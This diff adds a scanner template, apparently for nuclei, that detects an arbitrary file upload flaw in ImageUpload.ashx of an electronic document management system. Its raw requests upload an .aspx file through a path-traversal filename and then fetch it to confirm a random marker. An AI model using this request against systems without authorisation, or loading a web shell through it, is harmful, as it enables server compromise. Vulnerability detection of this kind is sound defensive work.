@@ -1,0 +1,53 @@
+id: dianziziliao-ImageUpload-upload
+
+info:
+  name: 电子资料管理系统 ImageUpload.ashx 任意文件上传漏洞
+  author: dianziziliao
+  severity: high
+  tags: dianziziliao
+
+http:
+  - raw:
+      - |
+        POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="isUpload"
+        
+        印章图片
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="entid"
+        
+        666
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="Type"
+        
+        1
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="Filedata"; filename="../{{randstr}}.aspx"
+        Content-Type: text/plain
+        
+        {{randstr_1}}
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+
+      - |+
+        GET /{{randstr}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
